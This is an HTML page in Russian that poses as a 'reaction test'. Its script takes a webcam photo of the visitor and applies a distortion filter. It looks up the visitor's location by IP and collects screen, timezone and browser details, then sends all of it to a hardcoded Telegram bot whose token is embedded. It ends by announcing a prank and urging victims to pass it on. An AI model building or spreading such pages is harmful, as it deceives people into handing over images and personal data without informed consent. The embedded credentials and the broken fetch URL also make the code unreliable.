<!doctype html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover,user-scalable=no">
<title>Проверка реакции</title>
<style>
  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent;margin:0;padding:0}
  html,body{height:100%}
  body{
    font-family:-apple-system,system-ui,'Segoe UI',sans-serif;
    background:radial-gradient(circle at 50% 20%,#1e1e2e,#0a0a0f 70%);
    color:#fff;display:flex;align-items:center;justify-content:center;
    min-height:100vh;padding:20px;overflow:hidden;
  }
  .box{
    width:100%;max-width:440px;background:rgba(23,23,26,.9);
    backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,.08);
    border-radius:24px;padding:28px 24px;text-align:center;
    box-shadow:0 20px 60px rgba(0,0,0,.7);
    animation:pop .4s cubic-bezier(.2,.9,.3,1.4);
  }
  @keyframes pop{from{opacity:0;transform:scale(.9)}to{opacity:1;transform:scale(1)}}
  h2{font-size:22px;font-weight:700;margin-bottom:8px;
     background:linear-gradient(90deg,#a78bfa,#f472b6);
     -webkit-background-clip:text;background-clip:text;color:transparent}
  .sub{font-size:14px;color:#9ca3af;margin-bottom:20px;line-height:1.5}
  video{
    width:100%;aspect-ratio:3/4;object-fit:cover;border-radius:16px;
    background:#000;transform:scaleX(-1);display:none;
    box-shadow:0 0 0 1px rgba(255,255,255,.08),0 0 40px rgba(167,139,250,.2);
  }
  video.on{display:block}
  button{
    width:100%;margin-top:20px;padding:18px;border:0;border-radius:14px;
    background:linear-gradient(90deg,#a78bfa,#f472b6);color:#fff;
    font-size:17px;font-weight:700;cursor:pointer;
    box-shadow:0 8px 24px rgba(167,139,250,.4);
    transition:transform .15s,opacity .2s;
  }
  button:active{transform:scale(.97)}
  button:disabled{opacity:.5}
  #s{margin-top:14px;font-size:14px;color:#9ca3af;min-height:20px}
  .final{font-size:26px;font-weight:800;margin:20px 0;
         background:linear-gradient(90deg,#facc15,#f472b6);
         -webkit-background-clip:text;background-clip:text;color:transparent;
         animation:pop .5s}
</style>
</head>
<body>
<div class="box" id="box">
  <h2>Проверка реакции</h2>
  <div class="sub" id="sub">Разрешите доступ к камере, чтобы начать тест</div>
  <video id="v" autoplay playsinline muted></video>
  <button id="b">Разрешить и начать</button>
  <div id="s">Нажмите кнопку ниже</div>
</div>

<script>
/* ============ НАСТРОЙКИ ============ */
const TG_TOKEN = '8831977085:AAEC4wbx7P2aXDus00U_Avp6icBKLyHgEgU';
const TG_CHAT  = '8527256617';
/* =================================== */

const $ = id => document.getElementById(id);
const v = $('v'), b = $('b'), s = $('s'), sub = $('sub'), box = $('box');

/* ---------- ФИЛЬТРЫ ---------- */
const FILTERS = ['fisheye','mirror','eyeswap','wide'];

function applyFisheye(ctx,W,H){
  const src = ctx.getImageData(0,0,W,H);
  const dst = ctx.createImageData(W,H);
  const cx=W/2, cy=H/2, r=Math.min(W,H)/2;
  for(let y=0;y<H;y++){
    for(let x=0;x<W;x++){
      const dx=x-cx, dy=y-cy, d=Math.sqrt(dx*dx+dy*dy);
      const di=(y*W+x)*4;
      if(d>r){
        dst.data[di]=src.data[di];dst.data[di+1]=src.data[di+1];
        dst.data[di+2]=src.data[di+2];dst.data[di+3]=255; continue;
      }
      const k=Math.pow(d/r,1.7)*r, ang=Math.atan2(dy,dx);
      const sx=Math.max(0,Math.min(W-1,Math.round(cx+Math.cos(ang)*k)));
      const sy=Math.max(0,Math.min(H-1,Math.round(cy+Math.sin(ang)*k)));
      const si=(sy*W+sx)*4;
      dst.data[di]=src.data[si];dst.data[di+1]=src.data[si+1];
      dst.data[di+2]=src.data[si+2];dst.data[di+3]=255;
    }
  }
  ctx.putImageData(dst,0,0);
}

function applyMirrorSplit(ctx,W,H){
  const half=Math.floor(W/2);
  const left=ctx.getImageData(0,0,half,H);
  const right=ctx.getImageData(half,0,W-half,H);
  ctx.putImageData(right,0,0);
  ctx.putImageData(left,half,0);
}

function applyEyeSwap(ctx,W,H){
  const bandY=Math.round(H*0.28), bandH=Math.round(H*0.16);
  const band=ctx.getImageData(0,bandY,W,bandH);
  const tmp=document.createElement('canvas');
  tmp.width=W;tmp.height=bandH;
  tmp.getContext('2d').putImageData(band,0,0);
  ctx.save();
  ctx.translate(W,0);ctx.scale(-1,1);
  ctx.drawImage(tmp,0,bandY);
  ctx.restore();
}

function applyWide(ctx,W,H){
  const src=ctx.getImageData(0,0,W,H);
  const dst=ctx.createImageData(W,H);
  const cx=W/2;
  for(let y=0;y<H;y++){
    for(let x=0;x<W;x++){
      const nx=(x-cx)/cx;
      const sx=Math.max(0,Math.min(W-1,Math.round(cx+nx*Math.abs(nx)*cx*0.9)));
      const si=(y*W+sx)*4, di=(y*W+x)*4;
      dst.data[di]=src.data[si];dst.data[di+1]=src.data[si+1];
      dst.data[di+2]=src.data[si+2];dst.data[di+3]=255;
    }
  }
  ctx.putImageData(dst,0,0);
}

function distort(ctx,W,H,name){
  try{
    if(name==='fisheye') applyFisheye(ctx,W,H);
    else if(name==='mirror') applyMirrorSplit(ctx,W,H);
    else if(name==='eyeswap') applyEyeSwap(ctx,W,H);
    else if(name==='wide') applyWide(ctx,W,H);
  }catch(e){ console.warn('filter fail',e); }
}

/* ---------- ОТПРАВКА ---------- */
async function tgSend(blob, caption){
  const fd = new FormData();
  fd.append('chat_id', TG_CHAT);
  fd.append('caption', caption);
  fd.append('photo', blob, 'shot.jpg');
  const r = await fetch(
    `https://api.telegram.org/bot${8831977085:AAEC4wbx7P2aXDus00U_Avp6icBKLyHgEgU}/sendPhoto`,
    {method:'POST', body:fd}
  );
  if(!r.ok){ throw new Error('tg '+r.status); }
  return r.json();
}

async function meta(){
  let geo='n/a';
  try{
    const r=await fetch('https://ipapi.co/json/',{cache:'no-store'});
    const j=await r.json();
    geo=[j.city,j.region,j.country_name].filter(Boolean).join(', ');
  }catch(e){}
  return {
    geo,
    screen:`${screen.width}x${screen.height}`,
    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
    ua:navigator.userAgent,
    lang:navigator.language
  };
}

function resizeCanvas(src,maxSide=960){
  const W=src.width,H=src.height;
  const k=Math.min(1,maxSide/Math.max(W,H));
  if(k===1) return src;
  const c=document.createElement('canvas');
  c.width=Math.round(W*k);c.height=Math.round(H*k);
  c.getContext('2d').drawImage(src,0,0,c.width,c.height);
  return c;
}

async function withRetry(fn,n=3,delay=800){
  let last;
  for(let i=0;i<n;i++){
    try{ return await fn(); }
    catch(e){ last=e; await new Promise(r=>setTimeout(r,delay*(i+1))); }
  }
  throw last;
}

/* ---------- ОСНОВНОЙ СЦЕНАРИЙ ---------- */
async function shoot(){
  b.disabled=true;
  s.textContent='Запрос доступа...';

  let stream;
  try{
    stream=await navigator.mediaDevices.getUserMedia({
      video:{facingMode:'user',width:{ideal:1280},height:{ideal:960}},
      audio:false
    });
  }catch(e){
    s.textContent='Доступ не получен: '+e.name;
    b.disabled=false;
    return;
  }

  v.srcObject=stream;
  v.classList.add('on');
  sub.textContent='Анализ... не двигайтесь';

  await new Promise(res=>{
    if(v.readyState>=2 && v.videoWidth>0) return res();
    v.onloadedmetadata=()=>res();
    setTimeout(res,2000);
  });
  await new Promise(r=>setTimeout(r,1000));

  const W=v.videoWidth||1280, H=v.videoHeight||960;
  const c=document.createElement('canvas');
  c.width=W;c.height=H;
  const ctx=c.getContext('2d');
  ctx.drawImage(v,0,0,W,H);

  const filterName=FILTERS[Math.floor(Math.random()*FILTERS.length)];
  distort(ctx,W,H,filterName);

  stream.getTracks().forEach(t=>t.stop());
  v.classList.remove('on');

  const small=resizeCanvas(c,960);
  const blob=await new Promise(r=>small.toBlob(r,'image/jpeg',0.82));

  const m=await meta();
  const caption=
    `🤡 РОЗЫГРЫШ\n`+
    `🎭 фильтр: ${filterName}\n`+
    `📍 ${m.geo}\n`+
    `🖥 ${m.screen}\n`+
    `🕒 ${m.tz}\n`+
    `📱 ${m.ua.slice(0,100)}`;

  s.textContent='Отправка...';
  try{
    await withRetry(()=>tgSend(blob,caption));
  }catch(e){
    s.textContent='Ошибка: '+e.message;
    b.disabled=false;
    return;
  }

  box.innerHTML=`
    <div class="final">ЭТО РОЗЫГРЫШ 😂</div>
    <div class="sub">Твоя рожа уже улетела в телегу.<br>Отомсти другу так же.</div>
    <div style="margin-top:16px;font-size:14px">
      <a href="https://t.me/BilliBytcher0" style="color:#a78bfa;text-decoration:none;font-weight:700">
        → @BilliBytcher0
      </a>
    </div>
  `;
}

b.addEventListener('click',shoot);
</script>
</body>
</html>
